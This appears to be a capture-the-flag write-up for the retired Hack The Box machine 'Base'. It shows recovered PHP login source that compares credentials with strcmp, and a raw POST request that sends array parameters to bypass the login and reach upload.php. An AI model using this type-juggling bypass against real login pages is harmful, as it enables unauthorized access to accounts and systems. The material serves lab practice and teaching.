From http://10.129.95.184/login/
## Login.php.swp
This file is a little hard to read, but vim can clean it up.

```
┌──(kali㉿kali)-[~/…/HackTheBox/Retired Machines/Base/10 - loot]
└─$ vim -r login.php.swp
```

## The majority of the file rescued
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Welcome to Base</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="../assets/img/favicon.png" rel="icon">
  <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
  
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="../assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="../assets/css/style.css" rel="stylesheet">

</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top">
    <div class="container d-flex align-items-center justify-content-between">

      <h1 class="logo"><a href="index.html">BASE</a></h1>
      <!-- Uncomment below if you prefer to use an image logo -->
      <!-- <a href="index.html" class="logo"><img src="../assets/img/logo.png" alt="" class="img-fluid"></a>-->

      <nav id="navbar" class="navbar">
        <ul>
          <li><a class="nav-link scrollto" href="/#hero">Home</a></li>
          <li><a class="nav-link scrollto" href="/#about">About</a></li>
          <li><a class="nav-link scrollto" href="/#services">Services</a></li>
          <li><a class="nav-link scrollto" href="/#team">Team</a></li>
          <li><a class="nav-link scrollto" href="/#pricing">Pricing</a></li>
          <li><a class="nav-link scrollto" href="/#contact">Contact</a></li>
          <li><a class="nav-link scrollto action" href="/login.php">Login</a></li>
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->

    </div>
  </header><!-- End Header -->

    <!-- ======= Login Section ======= -->
    <section id="login" class="contact section-bg" style="padding: 160px 0">
      <div class="container" data-aos="fade-up">

        <div class="section-title mt-5" >
          <h2>Login</h2>
          <p>Use the form below to log into your account.</p>
        </div>

        <div class="row mt-2">

          <div class="col-lg-12 mt-5 mt-lg-0">

            <form id="login-form" action="" method="POST" role="form" style="background-color:#f8fbfe">
              <div class="row" align="center">
                <div class="form-group">
                  <input type="text" name="username" class="form-control" style="max-width: 30%;" id="username" placeholder="Your Username" required> 
???LINES MISSING
  <script src="../assets/js/main.js"></script>

</body>

</html>         


```

## php portion
```
<?php
session_start();                                                             
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }       
}
?>
```

## Type juggling
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
It may be possible to convert the variable type from a string to something else before the comparison.

## Converting from strings to arrays
Appending brackets to the end of the variable names to create arrays from strings.
```
POST /login/login.php HTTP/1.1
Host: 10.129.95.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.129.95.184
DNT: 1
Connection: keep-alive
Referer: http://10.129.95.184/login/login.php
Cookie: PHPSESSID=5p9l8r4rb8q8f3cuqsobnnsisk
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username[]=foo&password[]=bar
```

The `<script>alert('Wrong Username or Password')</script>` response doesn't appear!

Sure enough, we are redirected to http://10.129.95.184/upload.php
